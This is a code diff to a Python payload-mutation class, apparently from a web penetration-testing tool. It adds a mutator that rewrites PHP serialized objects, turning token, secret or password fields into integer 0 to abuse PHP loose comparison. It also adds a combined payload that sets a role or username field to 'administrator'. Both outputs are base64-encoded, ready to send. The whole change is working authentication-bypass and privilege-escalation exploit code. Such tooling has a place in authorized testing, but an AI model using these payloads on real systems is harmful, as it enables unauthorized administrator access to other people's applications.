@@ -610,6 +610,54 @@ class PayloadMutation:
                 pairs.append((key_tok, val_tok))
         return pairs
 
+    MODIFY_STRING_HINTS = [
+        "username", "user", "email", "login", "name",
+        "role", "admin", "level", "access", "privilege",
+        "taikhoan", "tendangnhap", "nguoidung", "dangnhap",
+        "vaitro", "quantri", "quyen", "capdo", "truycap",
+    ]
+    TOKEN_HINTS = [
+        "token", "secret", "key", "access", "auth", "session",
+        "sig", "hash", "csrf", "nonce", "password", "pass", "api",
+    ]
+
+    def __type_juggle(self, payload: str) -> Mutations:
+        results: Mutations = []
+        string_vals = [(k, v) for (k, v) in self._iter_php_pairs(payload) if v["kind"] == "s"]
+
+        for key_tok, val_tok in string_vals:
+            if key_tok is None or not any(h in key_tok["content"].lower() for h in self.TOKEN_HINTS):
+                continue
+            mutated = payload[:val_tok["start"]] + "i:0;" + payload[val_tok["end"]:]
+            encode_mutated = base64.b64encode(mutated.encode()).decode()
+            p = self._make_payload("type_juggle", f'{key_tok["content"]}->i:0', None, encode_mutated)
+            p["note"] = "PHP type juggling: token/secret string field changed to integer 0 (0 == non-numeric string is true in PHP < 8.0)"
+            results.append(p)
+
+        priv = next((kv for kv in string_vals if kv[0]
+                     and any(h in kv[0]["content"].lower() for h in self.MODIFY_STRING_HINTS)), None)
+        secret = next((kv for kv in string_vals if kv[0]
+                       and any(h in kv[0]["content"].lower() for h in self.TOKEN_HINTS)), None)
+        if priv and secret and priv[1]["start"] != secret[1]["start"]:
+            repls = [
+                (priv[1], f's:{len("administrator")}:"administrator";'),
+                (secret[1], "i:0;"),
+            ]
+            mutated = payload
+            for val_tok, new_tok in sorted(repls, key=lambda r: r[0]["start"], reverse=True):
+                mutated = mutated[:val_tok["start"]] + new_tok + mutated[val_tok["end"]:]
+            encode_mutated = base64.b64encode(mutated.encode()).decode()
+            p = self._make_payload(
+                "type_juggle_privesc",
+                f'{priv[0]["content"]}=administrator + {secret[0]["content"]}=i:0',
+                None, encode_mutated,
+            )
+            p["note"] = ("Combined privilege escalation: privilege field -> 'administrator' AND "
+                         "secret/token field type-juggled to integer 0 (PHP loose-compare bypass)")
+            results.append(p)
+
+        return results
+
     def __flip_boolean(self, payload: str) -> Mutations:
         results: Mutations = []
         for _key_tok, val_tok in self._iter_php_pairs(payload):
@@ -625,19 +673,13 @@ class PayloadMutation:
     def __modify_string(self, payload: str) -> Mutations:
         results: Mutations = []
         test_values = ["administrator", "admin", "root", "superuser"]
-        all_hints = [
-            "username", "user", "email", "login", "name",
-            "role", "admin", "level", "access", "privilege",
-            "taikhoan", "tendangnhap", "nguoidung", "dangnhap",
-            "vaitro", "quantri", "quyen", "capdo", "truycap",
-        ]
 
         for key_tok, val_tok in self._iter_php_pairs(payload):
             if val_tok["kind"] != "s":
                 continue
             if key_tok is None or key_tok["kind"] != "s":
                 continue
-            if not any(hint in key_tok["content"].lower() for hint in all_hints):
+            if not any(hint in key_tok["content"].lower() for hint in self.MODIFY_STRING_HINTS):
                 continue
 
             original_val = val_tok["content"]
@@ -683,6 +725,7 @@ class PayloadMutation:
             results += self._mutate_integer(origin)
         if self.probe == "modify_string":
             results += self.__modify_string(origin)
+        results += self.__type_juggle(origin)
 
         return results
 
